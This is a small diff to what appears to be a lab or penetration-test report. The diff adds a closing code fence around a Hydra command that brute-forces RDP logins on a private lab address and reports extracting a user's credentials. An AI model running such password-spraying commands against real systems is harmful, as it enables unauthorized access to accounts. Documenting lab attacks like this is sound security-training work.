@@ -49,6 +49,7 @@ Automated Password Spraying: Executed Hydra against the target RDP endpoint with
 
 ```bash
 hydra -l Victim_PC_Name -P ~/Desktop/passwords.txt rdp://192.168.10.20 -vV -t 4
+```
 Result: Hydra successfully extracted valid login credentials for user fahad after cycling through failed attempts.
 
 Figure 2.1: Hydra brute-force execution output displaying credential extraction success.
